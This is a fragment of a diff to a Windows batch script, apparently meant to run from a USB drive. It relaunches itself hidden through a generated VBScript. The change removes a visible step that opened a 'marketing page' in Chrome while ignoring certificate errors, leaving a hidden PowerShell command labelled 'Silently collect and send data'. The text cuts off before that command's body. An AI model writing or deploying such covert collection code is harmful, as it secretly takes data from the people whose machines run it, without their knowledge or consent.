@@ -16,12 +16,6 @@ echo WshShell.Run "cmd.exe /c ""%~f0"" silent", 0, False >> "%temp%\silent_usb.v
 start "" wscript.exe "%temp%\silent_usb.vbs"
 exit /b
  
-:run
-:: Open marketing page immediately
-start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --app="%MARKETING_URL%" --ignore-certificate-errors
-timeout /t 1 >nul
-powershell -command "$sig='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; Add-Type -MemberDefinition $sig -Name Win32 -Namespace Win32Functions; $hwnd = (Get-Process chrome | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object -First 1).MainWindowHandle; [Win32Functions.Win32]::ShowWindowAsync($hwnd, 3)"
-
  
 :: Silently collect and send data
 powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command ^
